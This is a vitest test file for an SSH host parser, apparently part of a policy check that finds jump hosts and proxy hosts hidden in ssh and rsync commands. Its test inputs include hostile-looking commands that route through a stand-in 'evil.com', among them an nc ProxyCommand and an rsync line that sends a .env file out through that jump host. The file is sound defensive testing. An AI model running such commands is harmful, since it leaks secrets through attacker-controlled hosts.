import { describe, it, expect } from 'vitest';
import { extractAllSshHosts, parseAllSshHostsFromCommand } from '../policy/ssh-parser.js';

describe('extractAllSshHosts', () => {
  it('extracts simple positional host', () => {
    expect(extractAllSshHosts(['safe.com'])).toContain('safe.com');
  });

  it('extracts host from user@host form', () => {
    expect(extractAllSshHosts(['user@safe.com'])).toContain('safe.com');
  });

  it('extracts -J jump host', () => {
    // ssh -J evil.com user@safe.com — traffic routes through evil.com
    const hosts = extractAllSshHosts(['-J', 'evil.com', 'user@safe.com']);
    expect(hosts).toContain('evil.com');
    expect(hosts).toContain('safe.com');
  });

  it('extracts multiple -J jump hosts (comma-separated chain)', () => {
    const hosts = extractAllSshHosts(['-J', 'hop1.com,hop2.com', 'user@final.com']);
    expect(hosts).toContain('hop1.com');
    expect(hosts).toContain('hop2.com');
    expect(hosts).toContain('final.com');
  });

  it('extracts -o ProxyJump= value', () => {
    const hosts = extractAllSshHosts(['-o', 'ProxyJump=evil.com', 'safe.com']);
    expect(hosts).toContain('evil.com');
    expect(hosts).toContain('safe.com');
  });

  it('extracts hosts from -o ProxyCommand (nc variant)', () => {
    // ssh -o ProxyCommand='nc evil.com 22' user@safe.com
    const hosts = extractAllSshHosts(['-o', 'ProxyCommand=nc evil.com 22', 'user@safe.com']);
    expect(hosts).toContain('evil.com');
    expect(hosts).toContain('safe.com');
  });

  it('handles user@host:port in jump chain', () => {
    const hosts = extractAllSshHosts(['-J', 'user@hop.com:2222', 'final.com']);
    expect(hosts).toContain('hop.com');
    expect(hosts).toContain('final.com');
  });

  it('returns empty array for no hosts', () => {
    expect(extractAllSshHosts([])).toEqual([]);
  });
});

describe('parseAllSshHostsFromCommand', () => {
  it('full command string — simple', () => {
    expect(parseAllSshHostsFromCommand('ssh user@safe.com')).toContain('safe.com');
  });

  it('full command string — with jump host', () => {
    const hosts = parseAllSshHostsFromCommand('ssh -J evil.com user@safe.com');
    expect(hosts).toContain('evil.com');
    expect(hosts).toContain('safe.com');
  });

  it('rsync with -e ssh jump', () => {
    // rsync -e 'ssh -J evil.com' .env user@safe.com:/tmp/
    const hosts = parseAllSshHostsFromCommand(
      "rsync -e 'ssh -J evil.com' .env user@safe.com:/tmp/"
    );
    // safe.com extracted from positional user@safe.com:/tmp/ → safe.com
    expect(hosts).toContain('safe.com');
  });
});
